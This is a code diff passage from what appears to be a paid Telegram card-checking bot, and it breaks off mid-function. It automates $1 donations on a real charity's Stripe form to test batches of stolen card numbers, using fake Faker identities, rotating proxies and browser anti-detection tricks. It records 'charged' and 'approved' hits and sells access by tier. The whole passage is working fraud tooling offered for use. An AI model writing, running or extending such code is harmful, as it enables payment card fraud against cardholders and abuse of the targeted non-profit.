+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except:
+                pass
+
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+
+                result = await check_card_boutique_api(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+
+                async with stats_lock:
+                    processed_count += 1
+
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                        print(f"🔥 [CHARGED] {card[:20]}...")
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["errors"] += 1
+                        print(f"⚠️ [ERROR] {card[:20]}...")
+
+                    if processed_count % 10 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+
+                if status_category in ["charged", "approved"]:
+                    ui, _ = format_boutique_api_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except:
+                        pass
+
+                    await save_hit_to_file(
+                        card=card, gateway="Boutique Vacation Rentals",
+                        response=result.get("message", "Approved"),
+                        price=f"${BOUTIQUE_AMOUNT/100:.2f}",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="Boutique Vacation Rentals", card=card,
+                            response=result.get("message", "Charged"),
+                            price=f"${BOUTIQUE_AMOUNT/100:.2f}",
+                            user=user_data, bin_info=bin_info, status_category="charged"
+                        )
+                        user_manager.increment_hits(u_id)
+
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in boutique_api_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+
+        if u_id in boutique_api_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+
+            summary = (
+                f"🏁 <b>Boutique Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+            )
+
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+
+        return stats
+
+    except Exception as e:
+        print(f"❌ Boutique mass error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        boutique_api_active_tasks.pop(u_id, None)
+        print(f"🏁 Boutique session ended")
+
+
+# ============ GLOBAL GREEN STRIPE GATEWAY (PLAYWRIGHT - COMPLETE) ============
+
+import asyncio
+import time
+import random
+import json
+import re
+import traceback
+import uuid
+from typing import Dict, Tuple, Optional
+from playwright.async_api import async_playwright, Page, Browser, BrowserContext
+from faker import Faker
+
+# Configuration
+GLOBALGREEN_URL = "https://globalgreen.org/donations/donate-to-global-green/"
+GLOBALGREEN_AMOUNT = "1.00"
+
+# Active tasks
+globalgreen_active_tasks = {}
+
+
+class GlobalGreenBrowser:
+    """Manage Playwright browser for Global Green"""
+    
+    def __init__(self):
+        self.playwright = None
+        self.browser = None
+        self.context = None
+        self._lock = asyncio.Lock()
+        
+    async def get_browser(self, proxy: str = None) -> Browser:
+        async with self._lock:
+            if self.browser is None:
+                self.playwright = await async_playwright().start()
+                
+                launch_options = {
+                    'headless': True,
+                    'args': [
+                        '--disable-blink-features=AutomationControlled',
+                        '--disable-dev-shm-usage',
+                        '--no-sandbox',
+                        '--disable-setuid-sandbox',
+                        '--disable-web-security',
+                        '--disable-features=IsolateOrigins,site-per-process',
+                        '--disable-site-isolation-trials',
+                        '--disable-features=BlockInsecurePrivateNetworkRequests',
+                    ]
+                }
+                
+                if proxy:
+                    proxy_url = format_proxy(proxy)
+                    if proxy_url:
+                        launch_options['proxy'] = {'server': proxy_url}
+                        print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
+                
+                self.browser = await self.playwright.chromium.launch(**launch_options)
+                print(f"✅ Browser launched")
+            
+            return self.browser
+    
+    async def get_context(self, proxy: str = None) -> BrowserContext:
+        if self.context is None:
+            browser = await self.get_browser(proxy)
+            
+            viewport = {
+                'width': random.choice([1366, 1440, 1536, 1920]),
+                'height': random.choice([768, 900, 1080])
+            }
+            
+            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            
+            self.context = await browser.new_context(
+                viewport=viewport,
+                user_agent=user_agent,
+                locale='en-US',
+                timezone_id='America/New_York',
+                java_script_enabled=True,
+                bypass_csp=True,
+                extra_http_headers={
+                    'Accept-Language': 'en-US,en;q=0.9',
+                }
+            )
+            
+            await self.context.add_init_script("""
+                Object.defineProperty(navigator, 'webdriver', {
+                    get: () => undefined
+                });
+            """)
+            
+            print(f"✅ Context created")
+        
+        return self.context
+    
+    async def close(self):
+        if self.context:
+            await self.context.close()
+            self.context = None
+        if self.browser:
+            await self.browser.close()
+            self.browser = None
+        if self.playwright:
+            await self.playwright.stop()
+            self.playwright = None
+
+
+async def fill_field_by_label(page: Page, label_text: str, value: str) -> bool:
+    """Fill a field by finding its label text, then the associated input"""
+    try:
+        # Find label by text, then get the 'for' attribute to find the input
+        label = await page.query_selector(f'label:has-text("{label_text}")')
+        if label:
+            for_id = await label.get_attribute('for')
+            if for_id:
+                await page.fill(f'#{for_id}', value)
+                print(f"✅ Filled {label_text} using label for: {for_id}")
+                return True
+        
+        # Try to find input with placeholder containing the label text
+        input_selector = f'input[placeholder*="{label_text}"]'
+        if await page.locator(input_selector).count() > 0:
+            await page.fill(input_selector, value)
+            print(f"✅ Filled {label_text} using placeholder")
+            return True
+        
+        # Try to find input with name containing the label text
+        name_selector = f'input[name*="{label_text.lower()}"]'
+        if await page.locator(name_selector).count() > 0:
+            await page.fill(name_selector, value)
+            print(f"✅ Filled {label_text} using name")
+            return True
+        
+        return False
+    except Exception as e:
+        print(f"⚠️ Could not fill {label_text}: {e}")
+        return False
+
+
+async def check_card_globalgreen_playwright(card: str, proxy: str = None, user_id: int = None) -> Dict:
+    """
+    Check card using Global Green Stripe gateway with Playwright
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [GLOBAL GREEN] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    print(f"{'='*80}")
+    
+    start_time = time.time()
+    browser_manager = GlobalGreenBrowser()
+    
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error",
+                "elapsed": 0
+            }
+        
+        cc, mm, yy, cvv = parts
+        
+        if len(yy) == 4:
+            yy = yy[2:]
+        
+        # Generate fake data
+        fake = Faker()
+        first_name = fake.first_name()
+        last_name = fake.last_name()
+        full_name = f"{first_name} {last_name}"
+        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 999)}@gmail.com"
+        phone = f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
+        
+        print(f"👤 User: {full_name} | 📧 {email}")
+        
+        # Get browser context
+        context = await browser_manager.get_context(proxy)
+        page = await context.new_page()
+        page.set_default_timeout(30000)
+        
+        # ============ STEP 1: Navigate ============
+        print(f"\n📡 Navigating to donation page...")
+        
+        try:
+            await page.goto(GLOBALGREEN_URL, wait_until='domcontentloaded', timeout=30000)
+            print(f"✅ Page loaded")
+        except Exception as e:
+            print(f"❌ Failed: {e}")
+            return {
+                "status": "error",
+                "result": "PAGE_LOAD_FAILED",
+                "message": f"Failed to load page: {str(e)[:100]}",
+                "status_display": "⚠️ PAGE ERROR",
+                "status_category": "error",
+                "elapsed": time.time() - start_time
+            }
+        
+        await page.wait_for_timeout(3000)
+        
+        # ============ STEP 2: Handle Cookie Consent ============
+        print(f"\n📡 Handling cookie consent...")
+        
+        try:
+            accept_selectors = [
+                'button:has-text("ACCEPT")',
+                'button:has-text("Accept")',
+                'button:has-text("Accept All")',
+                'button:has-text("OK")',
+                'button:has-text("Got it")',
+                'button:has-text("I agree")',
+            ]
+            for selector in accept_selectors:
+                try:
+                    if await page.locator(selector).count() > 0:
+                        await page.locator(selector).first.click()
+                        print(f"✅ Accepted cookies")
+                        await page.wait_for_timeout(2000)
+                        break
+                except:
+                    continue
+        except Exception as e:
+            print(f"⚠️ Cookie consent: {e}")
+        
+        # ============ STEP 3: Fill the form by label ============
+        print(f"\n📡 Filling donation form...")
+        
+        field_mappings = [
+            ('First', first_name),
+            ('Last', last_name),
+            ('Phone', phone),
+            ('Email', email),
+            ('Donation amount', GLOBALGREEN_AMOUNT),
+        ]
+        
+        for label_text, value in field_mappings:
+            await fill_field_by_label(page, label_text, value)
+            await page.wait_for_timeout(200)
+        
+        # ============ STEP 4: Fill Credit Card (Stripe) ============
+        print(f"\n📡 Filling credit card details...")
+        
+        try:
+            await page.wait_for_selector('iframe[title*="card"]', timeout=30000)
+            print(f"✅ Stripe iframe found")
+            
+            iframes = await page.query_selector_all('iframe')
+            print(f"Found {len(iframes)} iframes total")
+            
+            stripe_iframe = None
+            for iframe in iframes:
+                try:
+                    title = await iframe.get_attribute('title')
+                    src = await iframe.get_attribute('src')
+                    if title and ('card' in title.lower() or 'secure' in title.lower()):
+                        stripe_iframe = iframe
+                        print(f"Found Stripe iframe with title: {title}")
+                        break
+                    if src and 'stripe' in src.lower():
+                        stripe_iframe = iframe
+                        print(f"Found Stripe iframe with src: {src[:100]}")
+                        break
+                except:
+                    continue
+            
+            if stripe_iframe:
+                frame = await stripe_iframe.content_frame()
+                if frame:
+                    print(f"✅ Got Stripe frame")
+                    
+                    # Fill card number
+                    card_selectors = [
+                        'input[type="tel"]',
+                        'input[placeholder*="Card"]',
+                        'input[placeholder*="card"]',
+                        'input[name*="number"]',
+                        'input[data-elements-stable-field-name="cardNumber"]',
+                    ]
+                    for selector in card_selectors:
+                        try:
+                            await frame.fill(selector, cc)
+                            print(f"✅ Filled card number")
+                            break
+                        except:
+                            continue
+                    
+                    # Fill expiry
+                    expiry_selectors = [
+                        'input[placeholder*="MM"]',
+                        'input[placeholder*="mm"]',
+                        'input[placeholder*="Expiry"]',
+                        'input[placeholder*="expiry"]',
+                        'input[name*="expiry"]',
+                        'input[data-elements-stable-field-name="cardExpiry"]',
+                    ]
+                    for selector in expiry_selectors:
+                        try:
+                            await frame.fill(selector, f"{mm}{yy}")
+                            print(f"✅ Filled expiry")
+                            break
+                        except:
+                            continue
+                    
+                    # Fill CVV
+                    cvv_selectors = [
+                        'input[placeholder*="CVC"]',
+                        'input[placeholder*="cvc"]',
+                        'input[placeholder*="CVV"]',
+                        'input[placeholder*="cvv"]',
+                        'input[placeholder*="Security"]',
+                        'input[name*="cvc"]',
+                        'input[data-elements-stable-field-name="cardCvc"]',
+                    ]
+                    for selector in cvv_selectors:
+                        try:
+                            await frame.fill(selector, cvv)
+                            print(f"✅ Filled CVV")
+                            break
+                        except:
+                            continue
+                else:
+                    print(f"⚠️ Could not get frame from iframe")
+            else:
+                print(f"⚠️ Could not find Stripe iframe")
+                
+        except Exception as e:
+            print(f"⚠️ Stripe iframe error: {e}")
+        
+        # ============ STEP 5: Submit ============
+        print(f"\n🔥 Submitting donation...")
+        
+        # Try multiple ways to find the Donate Now button
+        submit_selectors = [
+            # Exact text match
+            'button:has-text("Donate Now")',
+            'button:has-text("Donate")',
+            'input[value="Donate Now"]',
+            'input[value="Donate"]',
+            # Common button classes
+            'button[class*="donate"]',
+            'button[class*="submit"]',
+            'button[class*="gform"]',
+            'button[type="submit"]',
+            # Any button with Donate text (case insensitive)
+            'button:has-text("donate")',
+            'input[type="submit"]',
+            # Fallback - any button on the page
+            'button:visible',
+        ]
+        
+        submitted = False
+        for selector in submit_selectors:
+            try:
+                if await page.locator(selector).count() > 0:
+                    await page.locator(selector).first.click()
+                    submitted = True
+                    print(f"✅ Clicked submit: {selector}")
+                    break
+            except Exception as e:
+                print(f"⚠️ Selector failed: {selector} - {e}")
+                continue
+        
+        if not submitted:
+            print(f"⚠️ Could not find submit button, trying to find any button with text...")
+            try:
+                buttons = await page.query_selector_all('button, input[type="submit"]')
+                for btn in buttons:
+                    try:
+                        text = await btn.text_content()
+                        value = await btn.get_attribute('value')
+                        if text and 'donate' in text.lower():
+                            await btn.click()
+                            submitted = True
+                            print(f"✅ Clicked button with text: {text}")
+                            break
+                        if value and 'donate' in value.lower():
+                            await btn.click()
+                            submitted = True
+                            print(f"✅ Clicked input with value: {value}")
+                            break
+                    except:
+                        continue
+            except Exception as e:
+                print(f"⚠️ Error finding button: {e}")
+            
+        if not submitted:
+            print(f"⚠️ Could not find submit button, trying JavaScript submit...")
+            try:
+                await page.evaluate("document.querySelector('form').submit()")
+                submitted = True
+                print(f"✅ Used JavaScript form submit")
+            except Exception as e:
+                print(f"❌ JavaScript submit failed: {e}")
+                return {
+                    "status": "error",
+                    "result": "SUBMIT_FAILED",
+                    "message": "Could not submit donation form",
+                    "status_display": "⚠️ SUBMIT ERROR",
+                    "status_category": "error",
+                    "elapsed": time.time() - start_time
+                }
+        
+        # ============ STEP 6: Wait and parse response ============
+        print(f"\n📡 Waiting for response...")
+        await page.wait_for_timeout(10000)
+        
+        page_content = await page.content()
+        page_text = page_content.lower()
+        
+        # Save screenshot
+        try:
+            screenshot_path = f"globalgreen_result_{int(time.time())}.png"
+            await page.screenshot(path=screenshot_path)
+            print(f"📸 Screenshot saved: {screenshot_path}")
+        except:
+            pass
+        
+        elapsed = time.time() - start_time
+        
+        # ============ STEP 7: Parse result ============
+        
+        # Check for insufficient funds
+        if 'insufficient funds' in page_text or 'insufficient_funds' in page_text:
+            print(f"💰 INSUFFICIENT FUNDS detected!")
+            return {
+                "status": "success",
+                "result": "INSUFFICIENT_FUNDS",
+                "message": "Your card has insufficient funds",
+                "status_display": "💰 INSUFFICIENT FUNDS",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": "$1.00",
+                "gateway": " Stripe"
+            }
+        
+        # Check for declined
+        if 'declined' in page_text or 'card_declined' in page_text:
+            print(f"❌ DECLINED detected!")
+            return {
+                "status": "declined",
+                "result": "DECLINED",
+                "message": "Your card was declined",
+                "status_display": "❌ DECLINED",
+                "status_category": "declined",
+                "elapsed": elapsed,
+                "price": "$1.00",
+                "gateway": " Stripe"
+            }
+        
+        # Check for thank you / success
+        if 'thank you' in page_text or 'success' in page_text:
+            print(f"✅ SUCCESS detected!")
+            return {
+                "status": "success",
+                "result": "CHARGED",
+                "message": "Donation successful ",
+                "status_display": "🔥 CHARGED 🔥",
+                "status_category": "charged",
+                "elapsed": elapsed,
+                "price": "$1.00",
+                "gateway": " Stripe"
+            }
+        
+        # Check for 3D Secure
+        if '3d secure' in page_text or '3ds' in page_text:
+            print(f"🔐 3D SECURE detected!")
+            return {
+                "status": "success",
+                "result": "3DS_REQUIRED",
+                "message": "3D Secure required",
+                "status_display": "🔐 3D REQUIRED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": "$1.00",
+                "gateway": " Stripe"
+            }
+        
+        # Check for CVV error
+        if 'cvv' in page_text or 'security code' in page_text:
+            print(f"✅ CVV LIVE detected!")
+            return {
+                "status": "success",
+                "result": "CVV_LIVE",
+                "message": "CVV verification failed ",
+                "status_display": "✅ CVV LIVE",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": "$1.00",
+                "gateway": " Stripe"
+            }
+        
+        # Check for error messages
+        error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', page_content, re.DOTALL)
+        if error_match:
+            error_html = error_match.group(1)
+            error_msg = re.sub(r'<[^>]+>', '', error_html).strip()
+            if error_msg:
+                print(f"❌ Error message: {error_msg}")
+                if 'insufficient' in error_msg.lower():
+                    return {
+                        "status": "success",
+                        "result": "INSUFFICIENT_FUNDS",
+                        "message": error_msg,
+                        "status_display": "💰 INSUFFICIENT FUNDS",
+                        "status_category": "approved",
+                        "elapsed": elapsed,
+                        "price": "$1.00",
+                        "gateway": "Stripe"
+                    }
+                return {
+                    "status": "declined",
+                    "result": "DECLINED",
+                    "message": error_msg,
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": elapsed,
+                    "price": "$1.00",
+                    "gateway": " Stripe"
+                }
+        
+        # Default
+        print(f"⚠️ UNKNOWN response")
+        return {
+            "status": "unknown",
+            "result": "UNKNOWN",
+            "message": "Unknown response from donation page",
+            "status_display": "⚠️ UNKNOWN",
+            "status_category": "unknown",
+            "elapsed": elapsed,
+            "price": "$1.00",
+            "gateway": "Stripe"
+        }
+        
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        elapsed = time.time() - start_time
+        return {
+            "status": "error",
+            "result": "ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": elapsed,
+            "price": "$1.00",
+            "gateway": " Stripe"
+        }
+    finally:
+        await browser_manager.close()
+        print(f"✅ Browser closed")
+
+
+def format_globalgreen_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Global Green Stripe response for display"""
+    if result is None:
+        result = {
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "message": "No response from gateway",
+            "elapsed": 0,
+            "price": "$1.00",
+            "gateway": " Stripe"
+        }
+
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", " Stripe")
+    price = result.get("price", "$1.00")
+
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+
+    clean_message = message[:80] if message else "Unknown"
+    if len(message) > 80:
+        clean_message += "..."
+
+    country_name = country.replace('🌐', '').strip() if country else "Unknown"
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+
+    bank_display = bank if bank and bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Strip charged \n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+    )
+
+    return ui, status_category
+
+
+# ============ COMMAND HANDLERS ============
+
+async def single_check_globalgreen(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Global Green Stripe - /gg <card>"""
+    if not await verify_group_access(update, context):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b> Stripe Gateway</b>\n\n"
+            "Usage: <code>/gg &lt;card&gt;</code>\n"
+            "Example: <code>/gg 4242424242424242|12|2028|123</code>\n\n"
+            "💰 Amount: $1.00\n"
+            "📍 Gateway: Global Green Non-Profit Stripe\n"
+            "✅ Checks: Charged, CVV Live, Insufficient Funds, 3D Secure",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4242424242424242|12|2028|123"
+        )
+        return
+
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        error_message = (
+            f"❌ <b> Stripe not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+
+    globalgreen_active_tasks[user_id] = True
+
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+
+        status_msg = await message.reply_text("🔄 Checking ...")
+
+        await speed_controller.wait_if_needed()
+        start = time.time()
+
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 Using proxy: {mask_proxy(proxy_str)}")
+
+        result = await check_card_globalgreen_playwright(card, proxy_str, user_id)
+
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+
+        bin_info = await get_bin_info(card)
+
+        try:
+            await status_msg.delete()
+        except:
+            pass
+
+        ui, status_category = format_globalgreen_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway=" Stripe",
+                response=result.get("message", "Approved"),
+                price="$1.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway=" Stripe", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$1.00",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+
+        user_manager.increment_checks(user_id)
+
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(
+            f"❌ <b>Error</b>\n\nCould not check card. Please try again later.\nError: {str(e)[:100]}",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+    finally:
+        globalgreen_active_tasks.pop(user_id, None)
+
+
+
+async def mass_check_globalgreen(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Global Green Stripe - /mgg <cards>"""
+    if not await verify_group_access(update, context):
+        return
+
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌  Stripe not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /gg for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+
+            await message.delete()
+            await mass_check_globalgreen_logic(update, context, cards, None)
+            return
+
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Stripe Mass Check</b>\n\n"
+            "Usage: <code>/mgg &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mgg\n\n"
+            "Example: <code>/mgg 4242424242424242|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $1.00\n"
+            "📍 Gateway: Global Green Non-Profit Stripe\n"
+            "✅ Only charged/approved cards will be shown",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Truncated to {max_batch} cards.")
+
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+
+    try:
+        await message.delete()
+    except:
+        pass
+
+    await mass_check_globalgreen_logic(update, context, cards, None)
+
+
+async def mass_check_globalgreen_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for Global Green Stripe gateway"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+
+    print(f"\n{'='*80}")
+    print(f"🚀 [GLOBAL GREEN MASS] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies")
+
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+
+    start_time = time.time()
+    proxy_index = 0
+
+    try:
+        globalgreen_active_tasks[u_id] = True
+        tier = user_manager.get_tier(u_id)
+
+        CONCURRENCY = {
+            "free": 1,
+            "premium": 2,
+            "ultimate": 3,
+            "admin": 3,
+        }.get(tier, 1)
+
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛  Stripe ($1)\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
